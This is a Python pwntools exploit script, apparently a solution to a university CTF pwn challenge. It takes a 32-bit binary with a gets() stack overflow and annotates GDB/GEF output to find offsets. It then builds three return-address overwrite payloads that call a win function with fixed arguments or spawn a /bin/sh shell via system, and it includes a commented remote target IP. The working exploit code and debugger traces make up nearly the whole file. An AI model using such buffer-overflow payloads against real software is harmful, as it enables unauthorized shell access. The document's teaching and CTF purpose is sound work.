#!/usr/bin/env python3

from pwn import *

# create ELF object
elf = context.binary = ELF("./challenge")

# create a process running the ELF object
p = process(elf.path)

# GDB stuff to automatically spin up GDB in a new terminal window (useful when troubleshooting your payloads).
# Note, you will need to `apt install gdbserver`.
# gdb.attach(p) # this will attach to the running process returned by process(), but note that attaching to a running process usually comes part way into the process rather than from the very beginning
# p = gdb.debug(elf.path) # this will startup the binary inside of gdb, so you don't miss stuff right at the beginning of the program.

# Connect to a remote server
# p = remote('139.180.162.37', 9000)

# Find offset
'''
$ gdb -q ./challenge
GEF for linux ready, type `gef' to start, `gef config' to configure
90 commands loaded and 5 functions added for GDB 12.1 in 0.01ms using Python engine 3.10
Reading symbols from ./challenge...
gef➤  !pwn cyclic 70
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaara
gef➤  run
Starting program: /home/kali/qutwh/challenge/challenge 
Can you exploit this?
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaara

Program received signal SIGSEGV, Segmentation fault.
0x6161616f in ?? ()
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x6161616b ("kaaa"?)
...snip...
$eip   : 0x6161616f ("oaaa"?)
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xfffface0│+0x0000: "paaaqaaara"         ← $esp
...snip...
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x6161616f
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "challenge", stopped 0x6161616f in ?? (), reason: SIGSEGV
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  !pwn cyclic -l 0x6161616f
56
'''
OFFSET = 56

# Jump to the start of win, and pass the arguments on the stack
def exploit1():
	# Look at disassembly to see how win references the two arguments
	# ebp +0x8 and ebp +0xc
	#   0x080491a8 <+18>:    cmp    DWORD PTR [ebp+0x8],0xdeadbeef
	#   0x080491af <+25>:    jne    0x80491e8 <win+82>
	#   0x080491b1 <+27>:    cmp    DWORD PTR [ebp+0xc],0x1337c0de

	# attack idea is to setup the stack with the functions arguments, such that EBP+0x8 == deadbeef and EBP + 0xC == 1337c0de
	# create fake stack frame: AAAAAAAA...AAA + saved EIP to be restored into EIP + AAAA (4 bytes of junk so that the next address is EBP+0x8 rather than EBP+0x4) + 0xdeadbeef + 0x1337c0de
	payload = b"A" * OFFSET + p32(elf.symbols['win']) + p32(0) + p32(0xdeadbeef) + p32(0x1337c0de)
	
	# send payload
	p.sendlineafter(b"Can you exploit this?\n", payload)

	# hop into interactive mode
	p.interactive()

# Jump to the `call system` instruction, and put '/bin/sh' string address on the stack
def exploit2():
	# Look at disassembly to find address of `call system`
	'''
	$ gdb -q ./challenge
	GEF for linux ready, type `gef' to start, `gef config' to configure
	90 commands loaded and 5 functions added for GDB 12.1 in 0.01ms using Python engine 3.10
	Reading symbols from ./challenge...
	gef➤  disass win
	Dump of assembler code for function win:
		0x08049196 <+0>:     push   ebp
		0x08049197 <+1>:     mov    ebp,esp
		...snip...
		0x080491d5 <+63>:    push   eax
		0x080491d6 <+64>:    call   0x8049050 <system@plt>
	 '''
	system_call = 0x80491d6

	# Use pwntools to find the address of a "/bin/sh" string in the binary
	binsh = next(elf.search(b"/bin/sh\x00"))

	# Remember arguments to functions are pushed onto the stack, so put it straight after our saved EIP
	payload = b"A" * OFFSET + p32(system_call) + p32(binsh)

	# send payload
	p.sendlineafter(b"Can you exploit this?\n", payload)

	# hop into interactive mode
	p.interactive()

# Rather than jumping to the `call system` instruction, jump to the one above it (push eax) which will push the value stored in the EAX register onto the stack
# APender has a very good writeup of this exploit, which you can check out here https://github.com/APenderGH/ctf_write-ups/tree/master/misc/deluqs-qutwh-pwn-challenge
def exploit3():
	push_eax = 0x080491d5

	# Taking a look at the disassembly for `vuln`, we see that it moves a value from the stack into EAX after the vulnerable `gets` call
	'''
	$ gdb -q ./challenge
	GEF for linux ready, type `gef' to start, `gef config' to configure
	90 commands loaded and 5 functions added for GDB 12.1 in 0.01ms using Python engine 3.10
	Reading symbols from ./challenge...
	gef➤  disass vuln
	Dump of assembler code for function vuln:
		0x080491ee <+0>:     push   ebp
		0x080491ef <+1>:     mov    ebp,esp
		...snip...
		0x08049220 <+50>:    call   0x8049030 <gets@plt>
		0x08049225 <+55>:    add    esp,0x10
		0x08049228 <+58>:    mov    eax,DWORD PTR [ebp-0xc] <- Move EBP-0xC into the eax register
	'''

	# Therefore if we can put the address of `/bin/sh` into EBP-0xC after the gets call, it will get stored in the EAX register
	# This means when we jump to the `push EAX` address, it will push the address of `/bin/sh` onto the stack, and the payload will behave the same as exploit2()

	# There's a number of ways to find exactly at what point we overwrite EBP-0xC. Lets use `pwn cyclic` again, and add a breakpoint right before the EAX register is populated with EBP-0xC:

	'''
	$ gdb -q ./challenge
	GEF for linux ready, type `gef' to start, `gef config' to configure
	90 commands loaded and 5 functions added for GDB 12.1 in 0.01ms using Python engine 3.10
	Reading symbols from ./challenge...
	gef➤  !pwn cyclic 70
	aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaara
	gef➤  break *vuln+58
	Breakpoint 1 at 0x8049228: file challenge.c, line 19.
	gef➤  run
	Starting program: /home/kali/qutwh/challenge/challenge
	Can you exploit this?
	aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaara

	Breakpoint 1, vuln () at challenge.c:19
	19          return b;
	...snip...
	──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
			0x804921f <vuln+49>        push   eax
			0x8049220 <vuln+50>        call   0x8049030 <gets@plt>
			0x8049225 <vuln+55>        add    esp, 0x10
	→  0x8049228 <vuln+58>        mov    eax, DWORD PTR [ebp-0xc]
			0x804922b <vuln+61>        mov    ebx, DWORD PTR [ebp-0x4]
			0x804922e <vuln+64>        leave  
			0x804922f <vuln+65>        ret    
			0x8049230 <main+0>         lea    ecx, [esp+0x4]
			0x8049234 <main+4>         and    esp, 0xfffffff0
	────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── source:challenge.c+19 ────
	...snip...
	──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
	[#0] Id 1, Name: "challenge", stopped 0x8049228 in vuln (), reason: BREAKPOINT
	────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
	[#0] 0x8049228 → vuln()
	─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
	gef➤  x/x $ebp-0xc
	0xffffaccc:     0x6161616b
	gef➤  x/x $eax
	0xffffaca4:     0x61616161
	'''
	# as can be seen, $ebp-0xc points to 0x6161616b, and $eax contains 0xffffaca4 which points to 0x61616161
	# if we go to the next instruction (thus executing the `mov eax, DWORD PTR [ebp-0xc]`), and take a look at eax again
	'''
	gef➤  ni
	20      }
	[ Legend: Modified register | Code | Heap | Stack | String ]
	────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
	$eax   : 0x6161616b ("kaaa"?)
	...snip...
	──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
			0x8049220 <vuln+50>        call   0x8049030 <gets@plt>
			0x8049225 <vuln+55>        add    esp, 0x10
			0x8049228 <vuln+58>        mov    eax, DWORD PTR [ebp-0xc]
	→  0x804922b <vuln+61>        mov    ebx, DWORD PTR [ebp-0x4]
			0x804922e <vuln+64>        leave  
			0x804922f <vuln+65>        ret    
			0x8049230 <main+0>         lea    ecx, [esp+0x4]
			0x8049234 <main+4>         and    esp, 0xfffffff0
			0x8049237 <main+7>         push   DWORD PTR [ecx-0x4]
	────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── source:challenge.c+20 ────
	...snip...
	──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
	[#0] Id 1, Name: "challenge", stopped 0x804922b in vuln (), reason: SINGLE STEP
	────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
	[#0] 0x804922b → vuln()
	─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
	gef➤  x/x $eax
	0x6161616b: Cannot access memory at address 0x6161616b
	'''
	# $eax now contains 0x6161616b. This corresponds to an offset of 40:
	'''
	gef➤  !pwn cyclic -l 0x6161616b
	40
	'''
	EAX_OFFSET = 40
	# so our payload should look like A * 40 + address of `/bin/sh` that will get loaded into EAX, and then pushed onto the stack + A * (56 - 40 - len(address of /bin/sh)) + address of push_eax
	binsh = next(elf.search(b"/bin/sh\x00"))
	payload = b"A" * EAX_OFFSET + p32(binsh) + b"A" * (OFFSET - EAX_OFFSET - len(p32(binsh))) + p32(push_eax)

	# send payload
	p.sendlineafter(b"Can you exploit this?\n", payload)

	# hop into interactive mode
	p.interactive()

if __name__ == "__main__":
	# choose your exploit!
	# exploit1()
	# exploit2()
	# exploit3()
